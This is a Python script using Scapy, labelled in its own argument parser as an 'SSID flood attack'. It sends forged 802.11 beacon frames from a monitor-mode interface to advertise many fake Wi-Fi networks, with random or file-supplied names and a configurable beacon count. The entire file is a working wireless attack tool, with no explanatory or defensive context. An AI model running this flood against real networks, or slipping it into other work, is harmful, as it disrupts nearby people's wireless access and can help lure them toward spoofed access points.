from scapy.all import *
from random import choice
from string import ascii_uppercase
import requests, time, threading, sys, netifaces, argparse

parser = argparse.ArgumentParser(prog="Scapy SSID flood attack",
                                 usage="%(prog)s -i mon0 [-n 5 | -f path/to/file] [-c 10]",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-n", "--ssid-number", required=False, help="The amount of fake SSIDs to generate")
parser.add_argument("-f", "--ssid-file", required=False, help="A file with ssid names to flood with")
parser.add_argument("-c", "--count", required=False, help="Number of beacons to send per ssid", default="10")


args = parser.parse_args()



interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'], addr3=interface[0]['addr'])

beacon = Dot11Beacon(cap='ESS+privacy')


channel = Dot11Elt(ID='DSset', info=chr(11))

tmpFrame = RadioTap()/dot11/beacon/channel

if args.ssid_number:
    for i in range(int(args.ssid_number)):
        ssid = ''.join(choice(ascii_uppercase) for i in range(8))
        essid = Dot11Elt(ID='SSID',info=str(ssid), len=len(str(ssid)))
        frame=tmpFrame/essid
        print("Sending %d beacons for ssid %s" % (int(args.count), ssid))
        sendp(frame, iface=args.Interface, inter=1, count=int(args.count))

else:
    with open(args.ssid_file) as f:
        for line in f:
            if len(line) > 32:
                continue
            essid = Dot11Elt(ID='SSID',info=str(line), len=len(str(line)))
            frame=tmpFrame/essid
            print("Sending %d beacons for ssid %s" % (int(args.count), line), end="")
            sendp(frame, iface=args.Interface, inter=1, count=int(args.count))
